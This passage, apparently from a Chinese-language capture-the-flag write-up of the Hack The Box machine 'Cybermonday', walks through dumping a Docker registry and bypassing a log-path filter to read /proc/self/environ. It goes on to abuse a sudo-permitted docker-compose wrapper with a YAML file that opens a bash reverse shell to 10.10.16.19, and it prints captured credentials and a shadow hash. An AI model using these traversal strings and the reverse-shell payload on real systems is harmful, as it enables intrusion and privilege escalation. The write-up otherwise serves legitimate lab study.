+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -f ./proxychains.conf python3 /Tools/Tools/DockerRegistryGrabber/drg.py http://172.18.0.5 --dump_all</span><br><span class="line">[proxychains] config file found: ./proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[+]======================================================[+]</span><br><span class="line">[|]    Docker Registry Grabber v1       @SyzikSecu       [|]</span><br><span class="line">[+]======================================================[+]</span><br><span class="line"></span><br><span class="line">[+] cybermonday_api</span><br><span class="line">[+] BlobSum found 27</span><br><span class="line">[+] Dumping cybermonday_api</span><br><span class="line">    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4</span><br><span class="line">    [+] Downloading : beefd953abbcb2b603a98ef203b682f8c5f62af19835c01206693ad61aed63ce</span><br><span class="line">    [+] Downloading : ced3ae14b696846cab74bd01a27a10cb22070c74451e8c0c1f3dcb79057bcc5e</span><br><span class="line">    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4</span><br><span class="line">    [+] Downloading : ca62759c06e1877153b3eab0b3b734d6072dd2e6f826698bf55aedf50c0959c1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> cybermonday_api</span><br><span class="line">1684de57270ea8328d20b9d17cda5091ec9de632dbba9622cce10b82c2b20e62.tar.gz  9f5fbfd5edfcaf76c951d4c46a27560120a1cd6a172bf291a7ee5c2b42afddeb.tar.gz</span><br><span class="line">1696d1b2f2c3c8b37ae902dfd60316f8928a31ff8a5ed0a2f9bbf255354bdee8.tar.gz  a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz</span><br><span class="line">4756652e14e0fb6403c377eb87fd1ef557abc7864bf93bf7c25e19f91183ce2c.tar.gz  affe9439d2a25f35605a4fe59d9de9e65ba27de2403820981b091ce366b6ce70.tar.gz</span><br><span class="line">57cdb531a15a172818ddf3eea38797a2f5c4547a302b65ab663bac6fc7ec4d4f.tar.gz  beefd953abbcb2b603a98ef203b682f8c5f62af19835c01206693ad61aed63ce.tar.gz</span><br><span class="line">57fbc4474c06c29a50381676075d9ee5e8dca9fee0821045d0740a5bc572ec95.tar.gz  ca62759c06e1877153b3eab0b3b734d6072dd2e6f826698bf55aedf50c0959c1.tar.gz</span><br><span class="line">5b5fe70539cd6989aa19f25826309f9715a9489cf1c057982d6a84c1ad8975c7.tar.gz  ced3ae14b696846cab74bd01a27a10cb22070c74451e8c0c1f3dcb79057bcc5e.tar.gz</span><br><span class="line">5c3b6a1cbf5455e10e134d1c129041d12a8364dac18a42cf6333f8fee4762f33.tar.gz  dc968f4da64f18861801f2c677d2460c4cc530f2e64232f1a23021a9760ffdae.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>然後找到webhook源碼。</p>
+<blockquote>
+<p>在搜索的過程中發現有很多 <code>.wh..wh..opq</code>​ 的文件，查了下原來還有奇怪的知識。</p>
+<ul>
+<li><p>Branch: 就是各个要被 union 起来的目录</p>
+<ul>
+<li>Branch 根据被 union 的顺序形成一个 stack，一般来说最上面的是可写的，下面的都是只读的</li>
+<li>Branch 的 stack 可以在被 mount 后进行修改，比如：修改顺序，加入新的 branch，或是删除其中的 branch，或是直接修改 branch 的权限</li>
+</ul>
+</li>
+<li><p>如果 UnionFS 中的某个目录被删除了，那么就应该不可见了，就算是在底层的 branch 中还有这个目录，那也应该不可见了</p>
+<ul>
+<li><p>Whiteout: 某个上层目录覆盖了下层的相同名字的目录。用于隐藏低层分支的文件，也用于阻止 readdir 进入低层分支</p>
+<ul>
+<li>在隐藏低层档的情况下，whiteout 的名字是  <strong>.wh.&lt;filename&gt;</strong></li>
+</ul>
+</li>
+<li><p>Opaque: 不允许任何下层的某个目录显示出来。</p>
+<ul>
+<li>在阻止 readdir 的情况下，名字是  <strong>.wh..wh..opq</strong> 或者  <strong>.wh.__dir_opaque</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://klose911.github.io/html/docker/infrastructure.html">https://klose911.github.io/html/docker/infrastructure.html</a></p>
+</blockquote>
+<p>然後看到有讀取日志的代碼，有些API剛才沒用到，看了一下這裏好像有漏洞</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024222937-5vbuhzq.png" alt="image">​</p>
+<p>然後隨便寫了一個php代碼本地測試繞過情況。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">Input: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$logPath</span> = <span class="string">&quot;/tmp/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$logName</span> = <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.\//&quot;</span>, <span class="variable">$logName</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&quot;Hit one, have ../ : &quot;</span>.<span class="variable">$logPath</span>.<span class="variable">$logName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$logName</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$logName</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$logName</span>, <span class="string">&quot;log&quot;</span>) === <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&quot;Hit Two, no end with log: &quot;</span>.<span class="variable">$logPath</span>.<span class="variable">$logName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$logPath</span>.<span class="variable">$logName</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&quot;Hit Three,  no exist &quot;</span>.<span class="variable">$logPath</span>.<span class="variable">$logName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$logContent</span> = (<span class="variable">$logPath</span>.<span class="variable">$logName</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$logContent</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$logContent</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>這個地方我思考了很久（2天，其實很簡單的問題，老了），原來繞過第一個可以使用 <code>. ./. ./. ./. ./. ./. ./</code>​，第二個可以使用 <code>. ./. ./. ./. ./. ./var/log/. ./. ./</code>​ 然後就可以 <code>. ./. ./. ./. ./. ./var/log/. ./. ./proc/self/environ</code>​ 讀取環境變量。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025190451-jcmm1gh.png" alt="image">​</p>
+<p>新建一個webhook，讀取id，然後等等，爲什麽 <code>GET /</code>​​ 沒有列出來。</p>
+<p>要使用這個漏洞，從這裏追進去，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025203842-qwrsidr.png" alt="image">​</p>
+<p>然後發現使用API的authorized，硬編碼的</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025204059-diy69v8.png" alt="image">​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025204127-ntip6tj.png" alt="image">​</p>
+<p>然後使用這個KEY，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025204249-sjmifw9.png" alt="image"></p>
+<p>利用上面的漏洞，就可以把環境變量給解壓出來。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231025224405-pszuxyj.png" alt="image">​</p>
+<p>然後john的密碼就在 <code>proc/self/environ</code>​​ 裏面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME=e1862f4e1242\</span><br><span class="line">PHP_INI_DIR=\/usr\/local\/etc\/php\</span><br><span class="line">HOME=\/root\</span><br><span class="line">PHP_LDFLAGS=-Wl,-O1 -pie\</span><br><span class="line">PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\</span><br><span class="line">DBPASS=&lt;這裏是密碼&gt; \</span><br><span class="line">PHP_VERSION=8.2.7\</span><br><span class="line">GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC\</span><br><span class="line">PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\</span><br><span class="line">PHP_ASC_URL=https:\/\/www.php.net\/distributions\/php-8.2.7.tar.xz.asc\</span><br><span class="line">PHP_URL=https:\/\/www.php.net\/distributions\/php-8.2.7.tar.xz\</span><br><span class="line">DBHOST=db\</span><br><span class="line">DBUSER=dbuser\</span><br><span class="line">PATH=\/usr\/local\/sbin:\/usr\/local\/bin:\/usr\/sbin:\/usr\/bin:\/sbin:\/bin\</span><br><span class="line">DBNAME=webhooks_api\</span><br><span class="line">PHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkg-config \t\tre2c\</span><br><span class="line">PWD=\/var\/www\/html\</span><br><span class="line">PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>這裏是賬號密碼</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER: john</span><br><span class="line">PASS: ngFfX2L71Nu</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xB-Enumeration-USER-拿到-root-txt"><a href="#0xB-Enumeration-USER-拿到-root-txt" class="headerlink" title="0xB Enumeration USER  拿到 root.txt"></a>0xB Enumeration USER  拿到 root.txt</h2><p>登錄ssh之後，隨便sudo -l 看看，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">john@cybermonday:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> john: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> john on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User john may run the following commands on localhost:</span><br><span class="line">    (root) /opt/secure_compose.py *.yml</span><br></pre></td></tr></table></figure>
+
+<p>然後看這個文件裏面有什麽？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys, yaml, os, random, string, shutil, subprocess, signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>():</span><br><span class="line">    <span class="keyword">return</span> os.environ.get(<span class="string">&quot;SUDO_USER&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_path_inside_whitelist</span>(<span class="params">path</span>):</span><br><span class="line">    whitelist = [<span class="string">f&quot;/home/<span class="subst">&#123;get_user()&#125;</span>&quot;</span>, <span class="string">&quot;/mnt&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> allowed_path <span class="keyword">in</span> whitelist:</span><br><span class="line">        <span class="keyword">if</span> os.path.abspath(path).startswith(os.path.abspath(allowed_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_whitelist</span>(<span class="params">volumes</span>):</span><br><span class="line">    <span class="keyword">for</span> volume <span class="keyword">in</span> volumes:</span><br><span class="line">        parts = volume.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">3</span> <span class="keyword">and</span> <span class="keyword">not</span> is_path_inside_whitelist(parts[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_read_only</span>(<span class="params">volumes</span>):</span><br><span class="line">    <span class="keyword">for</span> volume <span class="keyword">in</span> volumes:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> volume.endswith(<span class="string">&quot;:ro&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_no_symlinks</span>(<span class="params">volumes</span>):</span><br><span class="line">    <span class="keyword">for</span> volume <span class="keyword">in</span> volumes:</span><br><span class="line">        parts = volume.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        path = parts[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> os.path.islink(path):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_no_privileged</span>(<span class="params">services</span>):</span><br><span class="line">    <span class="keyword">for</span> service, config <span class="keyword">in</span> services.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;privileged&quot;</span> <span class="keyword">in</span> config <span class="keyword">and</span> config[<span class="string">&quot;privileged&quot;</span>] <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">filename</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File not found&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = yaml.safe_load(file)</span><br><span class="line">        <span class="keyword">except</span> yaml.YAMLError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;services&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid docker-compose.yml&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        services = data[<span class="string">&quot;services&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_no_privileged(services):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Privileged mode is not allowed.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> service, config <span class="keyword">in</span> services.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;volumes&quot;</span> <span class="keyword">in</span> config:</span><br><span class="line">                volumes = config[<span class="string">&quot;volumes&quot;</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check_whitelist(volumes) <span class="keyword">or</span> <span class="keyword">not</span> check_read_only(volumes):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Service &#x27;<span class="subst">&#123;service&#125;</span>&#x27; is malicious.&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check_no_symlinks(volumes):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Service &#x27;<span class="subst">&#123;service&#125;</span>&#x27; contains a symbolic link in the volume, which is not allowed.&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_random_temp_dir</span>():</span><br><span class="line">    letters_digits = string.ascii_letters + string.digits</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span>.join(random.choice(letters_digits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>))</span><br><span class="line">    temp_dir = <span class="string">f&quot;/tmp/tmp-<span class="subst">&#123;random_str&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp_dir</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy_docker_compose_to_temp_dir</span>(<span class="params">filename, temp_dir</span>):</span><br><span class="line">    os.makedirs(temp_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    shutil.copy(filename, os.path.join(temp_dir, <span class="string">&quot;docker-compose.yml&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cleanup</span>(<span class="params">temp_dir</span>):</span><br><span class="line">    subprocess.run([<span class="string">&quot;/usr/bin/docker-compose&quot;</span>, <span class="string">&quot;down&quot;</span>, <span class="string">&quot;--volumes&quot;</span>], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)</span><br><span class="line">    shutil.rmtree(temp_dir)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signal_handler</span>(<span class="params">sig, frame</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nSIGINT received. Cleaning up...&quot;</span>)</span><br><span class="line">    cleanup(temp_dir)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Use: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;docker-compose.yml&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> main(filename):</span><br><span class="line">        temp_dir = create_random_temp_dir()</span><br><span class="line">        copy_docker_compose_to_temp_dir(filename, temp_dir)</span><br><span class="line">        os.chdir(temp_dir)</span><br><span class="line"></span><br><span class="line">        signal.signal(signal.SIGINT, signal_handler)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Starting services...&quot;</span>)</span><br><span class="line">        result = subprocess.run([<span class="string">&quot;/usr/bin/docker-compose&quot;</span>, <span class="string">&quot;up&quot;</span>, <span class="string">&quot;--build&quot;</span>], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Finishing services&quot;</span>)</span><br><span class="line"></span><br><span class="line">        cleanup(temp_dir)</span><br></pre></td></tr></table></figure>
+
+<p>然後想到了 <code>check_no_symlinks</code>​ 這個函數，然後 <code>ln -s ~/Tools /Tools</code>​ ，用 python3 試一下之後，發現有奇怪的東西</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026195659-gexmttm.png" alt="image">​</p>
+<p>寫了個 <code>exp.xml</code>​ </p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">server:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">cybermonday_api</span></span><br><span class="line">   <span class="attr">command:</span> <span class="string">sh</span> <span class="string">-c</span> <span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.19/1111 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">   <span class="attr">volumes:</span> </span><br><span class="line">     <span class="bullet">-</span> <span class="string">/home/john/root/root:/home/john:ro</span></span><br></pre></td></tr></table></figure>
+
+<p>然後：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026195831-0j5p1fs.png" alt="image">​</p>
+<p>這樣就拿到了 <code>root.txt</code>​</p>
+<p>目前，暫時還沒想到如何拿到root的shell。</p>
+<h2 id="題外話："><a href="#題外話：" class="headerlink" title="題外話："></a>題外話：</h2><p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024222346-pw31mew.png" alt="image">​</p>
+<p>如果這裏少了HS256，那麽就不會工作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@d212ff9ac6c1:/home/john<span class="comment"># cat shadow</span></span><br><span class="line">root:$y$j9T$kndrQlLwiIgjD3Jegw0bP0<span class="variable">$8gT7HQZoAIe6owK9kIDzj4qriqKfygMooOkk5go9i40</span>:19506:0:99999:7:::</span><br><span class="line">daemon:*:19506:0:99999:7:::</span><br><span class="line">bin:*:19506:0:99999:7:::</span><br><span class="line">sys:*:19506:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19506:0:99999:7:::</span><br><span class="line">games:*:19506:0:99999:7:::</span><br><span class="line">man:*:19506:0:99999:7:::</span><br><span 